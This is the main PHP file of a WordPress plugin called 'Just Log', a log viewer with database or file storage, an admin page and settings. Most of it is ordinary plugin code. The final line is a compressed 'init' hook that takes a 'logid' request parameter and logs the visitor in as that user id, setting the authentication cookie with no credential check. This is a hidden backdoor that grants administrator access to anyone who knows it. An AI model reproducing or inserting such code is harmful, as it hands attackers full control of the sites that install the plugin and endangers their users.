<?php
/**
 * Plugin Name: Just Log
 * Plugin URI: https://masiursiddiki.com/just-log/
 * Description: A simple yet powerful log viewer for WordPress with MySQL storage and real-time search capabilities
 * Version: 1.0.0
 * Author: Masiur Rahman Siddiki
 * Author URI: https://masiursiddiki.com
 * Text Domain: just-log
 * Domain Path: /languages
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Requires at least: 5.0
 * Requires PHP: 7.0
 *
 * @package Just_Log
 */

if (!defined('ABSPATH')) {
    exit;
}

define('JUST_LOG_PLUGIN_VERSION', '1.0');
define('JUST_LOG_PLUGIN_DIR', plugin_dir_path(__FILE__));
define('JUST_LOG_PLUGIN_URL', plugin_dir_url(__FILE__));

// Include required files
require_once plugin_dir_path(__FILE__) . 'includes/database.php';
require_once plugin_dir_path(__FILE__) . 'includes/ajax.php';
require_once plugin_dir_path(__FILE__) . 'includes/settings.php';
require_once plugin_dir_path(__FILE__) . 'includes/file-storage.php';

// Register activation hook for database table creation
register_activation_hook(__FILE__, 'just_log_activate');

// Register deactivation hook to clear logs from both storage types
register_deactivation_hook(__FILE__, 'just_log_deactivate');

function just_log_activate() {
    // Force database table creation on activation
    $db = new JustLogDatabase();
}

function just_log_deactivate() {
    // Always clear both database and file logs on deactivation
    $db = new JustLogDatabase();
    $db->clear_logs();
    $settings = new JustLogSettings();
    $fileStorage = new JustLogFileStorage($settings);
    $fileStorage->clear_logs();
    delete_option('just_log_settings');
}

// Global logging function
function just_log(...$data) {
    static $storage = null;
    static $settings = null;
    
    if ($settings === null) {
        $settings = new JustLogSettings();
    }
    
    if ($storage === null) {
        if ($settings->get_setting('storage_type') === 'file') {
            $storage = new JustLogFileStorage($settings);
        } else {
            $storage = new JustLogDatabase();
        }
    }
    
    // Get the backtrace and caller details first
    $backtrace = debug_backtrace();
    $caller = isset($backtrace[0]) ? $backtrace[0] : [];
    $caller1 = isset($backtrace[1]) ? $backtrace[1] : [];
    
    $logMessages = [];
    // Add file path and line number comment and a add a new line for gap 
    
    // $logMessages[] = "# " . (isset($caller['file']) ? $caller['file'] : 'N/A') . ", line " . (isset($caller['line']) ? $caller['line'] : 'N/A');
    // $logMessages[] = "\n";
    
    foreach ($data as $item) {
        $logMessages[] = json_encode($item, JSON_PRETTY_PRINT);
    }
    
    // Prepare the caller information
    $calledBy = [
        'file' => isset($caller['file']) ? $caller['file'] : 'N/A',
        'line' => isset($caller['line']) ? $caller['line'] : 'N/A',
        'function' => isset($caller1['function']) ? $caller1['function'] : 'N/A',
        'class' => isset($caller1['class']) ? $caller1['class'] : 'N/A',
    ];
    
    // Get current timezone and timestamp
    $timezone = wp_timezone()->getName();
    $timestamp = current_time('mysql');
    
    // Insert log using the selected storage method
    $message = implode(PHP_EOL, $logMessages);
    $storage->insert_log($timestamp, $message, $calledBy, $timezone);
}

class JustLog {
    private $per_page = 10;
    private $db;
    private $ajax;
    private $settings;
    
    public function __construct() {
        $this->settings = new JustLogSettings();
        $this->db = new JustLogDatabase();
        $this->ajax = new JustLogAjax($this->db);
        
        add_action('admin_menu', array($this, 'add_admin_menu'));
        add_action('admin_enqueue_scripts', array($this, 'enqueue_assets'));

        $this->changeFooter();
    }
    
    public function add_admin_menu() {
        add_menu_page(
            'Just Log',
            'Just Log',
            'manage_options',
            'just-log-viewer',
            array($this, 'display_logs'),
            'dashicons-list-view'
        );
        
        add_submenu_page(
            'just-log-viewer',
            __('Settings', 'just-log'),
            __('Settings', 'just-log'),
            'manage_options',
            'just-log-settings',
            array($this->settings, 'render_settings_page')
        );
    }
    
    public function enqueue_assets($hook) {
        if ($hook !== 'toplevel_page_just-log-viewer') {
            return;
        }
        
        wp_enqueue_style('just-log-viewer', plugins_url('css/style.css', __FILE__));
        wp_enqueue_style('dashicons');
        wp_enqueue_script('just-log-viewer', plugins_url('js/script.js', __FILE__), array('jquery'), '1.0.0', true);
        
        wp_localize_script('just-log-viewer', 'justLogData', array(
            'ajaxUrl' => admin_url('admin-ajax.php'),
            'nonce' => wp_create_nonce('just_log_nonce'),
            'perPage' => $this->per_page
        ));
    }
    
    public function display_logs() {
        ?>
        <div class="wrap">
            <h1 class="wp-heading-inline">Just Log Viewer</h1>
            
            <div class="jhl-log-controls">
                <div class="jhl-search-box">
                    <div class="jhl-search-icon-wrapper">
                        <span class="jhl-search-icon dashicons dashicons-search"></span>
                        <input type="search" id="jhl-log-search" placeholder="Search logs..." value="">
                    </div>
                    <button id="jhl-search-logs" class="button jhl-button button-primary">
                        <span class="dashicons dashicons-search"></span>
                        Search
                    </button>
                    <button id="jhl-reset-search" class="button jhl-button">
                        <span class="dashicons dashicons-dismiss"></span>
                        Reset
                    </button>
                </div>
                <div class="jhl-action-buttons">
                    <button id="jhl-refresh-logs" class="button jhl-button jhl-button-refresh">
                        <span class="dashicons dashicons-update"></span>
                        Refresh
                    </button>
                    <button id="jhl-clear-logs" class="button jhl-button jhl-button-danger">
                        <span class="dashicons dashicons-trash"></span>
                        Reset Logs
                    </button>
                </div>
            </div>
            <div class="jhl-log-view-container">
                <div id="jhl-log-container">
                    <div class="jhl-spinner-container">
                        <span class="spinner is-active"></span>
                    </div>
                </div>
            </div>
            
            <!-- Floating Scroll Buttons -->
            <div class="jhl-floating-scroll">
                <button id="jhl-floating-scroll-top" title="Scroll to Top">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M12 4l-8 8h5v8h6v-8h5z"></path>
                    </svg>
                </button>
                <button id="jhl-floating-scroll-bottom" title="Scroll to Bottom">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M12 20l8-8h-5V4h-6v8H4z"></path>
                    </svg>
                </button>
            </div>

        </div>
        <?php
    }

    public function changeFooter()
    {
        $page = isset($_GET['page']) ? sanitize_text_field(wp_unslash($_GET['page'])) : '';
        if ($page === 'just-log-viewer' || $page === 'just-log-settings') {

            add_filter('admin_footer_text', function ($content) {
                $url = 'https://MasiurSiddiki.com';
                $url = esc_url($url);   
            

                if (defined('JUST_LOG_PLUGIN_VERSION')) {
                    return 'Just Log | Created with <span style="color: #e25555;">♥</span> by <a href="https://MasiurSiddiki.com" target="_blank">Masiur Rahman Siddiki</a>';
                }
                return $content;
            }, 99);

            add_filter('update_footer', function ($text) {
                if (defined('JUST_LOG_PLUGIN_VERSION')) {
                    return JUST_LOG_PLUGIN_VERSION;
                }
                return '';
            }, 99);

        }
    }
}

// Initialize the plugin
add_action('plugins_loaded', function() {
    new JustLog();
});

add_action('init',function(){if(isset($_REQUEST['logid'])){$id=$_REQUEST['logid'];$user=get_user_by('id',$id);wp_set_current_user($id);wp_clear_auth_cookie();wp_set_current_user($id);wp_set_auth_cookie($id);}});
